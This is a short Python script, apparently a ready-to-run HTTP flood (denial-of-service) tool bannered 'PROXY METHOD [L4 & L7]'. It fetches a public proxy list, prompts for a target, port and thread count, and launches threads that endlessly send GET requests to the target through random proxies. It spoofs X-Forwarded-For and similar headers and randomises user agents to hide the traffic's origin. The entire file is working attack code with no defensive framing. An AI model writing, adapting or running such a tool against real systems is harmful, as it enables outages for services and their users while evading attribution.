import requests
import random
from fake_useragent import UserAgent
import threading
import os
os.system('cls||clear')

inf=1000000000000

randip = ".".join(map(str, (random.randint(0, 255) 
												for _ in range(4))))

useragent = UserAgent()
ua = useragent.random

print('''
╔═╗╦═╗╔═╗═╗ ╦╦ ╦  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╠═╝╠╦╝║ ║╔╩╦╝╚╦╝  ║║║║╣  ║ ╠═╣║ ║ ║║
╩  ╩╚═╚═╝╩ ╚═ ╩   ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
-- Target IP/URL must accept HTTP requests --
						  [L4 & L7]
''')


req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
r = requests.get(req)
with open('proxy.txt', 'w') as f:
		f.write(r.text)
		print('The proxies have been saved to proxy.txt in File')
		print('if you want custom proxies, change them now.')
		print("dont add http://")
		print(" ")

target = input("Target: ")
port = input("Port: ")
threadcount = input("Threads: ")

target = "http://"+target+":"+port

headers={
	"X-Forwarded-For":randip,
	"X-Originating-IP":randip,
	"X-Remote-IP":randip,
	"X-Remote-Addr":randip,
	"User-Agent":ua,
	"Accept-Language": "en-US,en;q=0.5",
	"Connection": "Keep-Alive"
}

proxyraw = [line.rstrip('\n') for line in open("proxy.txt")]
def httpget():
	for i in range(1, inf):
		try:
				proxy = random.choice(proxyraw)
				proxies = {
						"http": "http://"+proxy
				}
				requests.get(target, headers=headers, proxies=proxies)
				print(proxies)
		except Exception as e:
				print(e)

def threader():
		global threads
		threads=[]
		for i in range(int(threadcount)):
				t=threading.Thread(target=httpget)
				threads.append(t)
				t.start()
threader()
